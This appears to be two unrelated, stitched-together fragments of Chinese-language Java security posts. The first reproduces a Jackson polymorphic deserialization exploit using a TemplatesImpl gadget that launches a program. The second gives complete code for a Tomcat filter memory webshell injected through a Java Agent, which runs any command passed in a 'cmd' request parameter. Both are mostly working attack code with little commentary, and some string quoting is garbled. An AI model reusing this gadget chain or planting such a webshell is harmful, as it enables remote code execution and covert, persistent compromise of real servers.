 0x03 漏洞复现Test.java public class Test{ public Object object; } SimpleCalc.java import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class SimpleCalc extends AbstractTranslet { public SimpleCalc() throws Exception { Runtime.getRuntime().exec("open -a Calculator"); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Poc.java import com.fasterxml.jackson.databind.ObjectMapper; import javax.xml.bind.DatatypeConverter; import java.io.File; import java.io.FileInputStream; public class Poc { public static void main(String[] args) throws Exception { String exp = readClassStr("/Users/f10wers13eicheng/Desktop/Java/JacksonDemo1/src/main/java/SimpleCalc.class"); String jsonInput = aposToQuotes("{"object":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',
" + "{
" + "'transletBytecodes':['"+exp+"'],
" + "'transletName':'huahua',
" + "'outputProperties':{}
" + "}
" + "]
" + "}"); System.out.println(jsonInput); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); Test test; try{ test = mapper.readValue(jsonInput, Test.class); }catch(Exception e){ e.printStackTrace(); } } public static String aposToQuotes(String json){ return json.replace("'", """); } public static String readClassStr(String cls) throws Exception{ File file = new File(cls); FileInputStream fileInputStream = new FileInputStream(file); byte[] bytes = new byte[(int) file.length()]; fileInputStream.read(bytes); String base64Encoded = DatatypeConverter.printBase64Binary(bytes); return base64Encoded; } } Jackson 是调用任意的构造函数与任意的setter方法，为什么会触发这条链子呢？ 7u21这条链子本质上其实是TemplateImpl类的类动态加载，配合上动态代理来打的，可是这里不论是动态代理，还是TeamplaesImpl.getOutputProperties()，都和 Jackson 没关系。

 利用Java Agent实现Spring Filter内存马复用上面的agentmain-Agent，修改字节码的关键在于transformer()方法，因此重写该方法即可 import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class Filter_Transform implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { try { //获取CtClass 对象的容器 ClassPool ClassPool classPool = ClassPool.getDefault(); //添加额外的类搜索路径 if (classBeingRedefined != null) { ClassClassPath ccp = new ClassClassPath(classBeingRedefined); classPool.insertClassPath(ccp); } //获取目标类 CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain"); //获取目标方法 CtMethod ctMethod = ctClass.getDeclaredMethod("doFilter"); //设置方法体 String body = "{" + "javax.servlet.http.HttpServletRequest request = $1
;" + "String cmd=request.getParameter("cmd");
" + "if (cmd !=null){
" + " Runtime.getRuntime().exec(cmd);
" + "System.out.println("Hello World");
"+ " }"+ "}"; ctMethod.setBody(body); //返回目标类字节码 byte[] bytes = ctClass.toBytecode(); return bytes; }catch (Exception e){ e.printStackTrace(); } return null; } } agent主类 import java.lang.instrument.Instrumentation; import java.lang.instrument.UnmodifiableClassException; public class agentmain_transform { public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException, UnmodifiableClassException { Class [] classes = inst.getAllLoadedClasses(); //获取目标JVM加载的全部类 for(Class cls : classes){ if (cls.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){ //添加一个transformer到Instrumentation，并重新触发目标类加载 inst.addTransformer(new Filter_Transform(),true); inst.retransformClasses(cls); } } } } MANIFEST.MF Manifest-Version: 1.0 Agent-Class: agentmain_transform Can-Redefine-Classes: true Can-Retransform-Classes: true Inject类 import com.sun.tools.attach.VirtualMachine; import com.sun.tools.attach.VirtualMachineDescriptor; import java.util.List; public class Inject_Agent { public static void main(String[] args) throws Exception { //调用VirtualMachine.list()获取正在运行的JVM列表 List<VirtualMachineDescriptor> list = VirtualMachine.list(); for (VirtualMachineDescriptor vmd : list) { if(vmd.displayName().equals("com.example.demo.DemoApplication")){ System.out.println("Yes"); //连接指定JVM VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id()); //加载Agent virtualMachine.loadAgent("/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/HelloDemo/target/HelloDemo-1.0-SNAPSHOT-jar-with-dependencies.jar"); //断开JVM连接 virtualMachine.detach(); } } } }
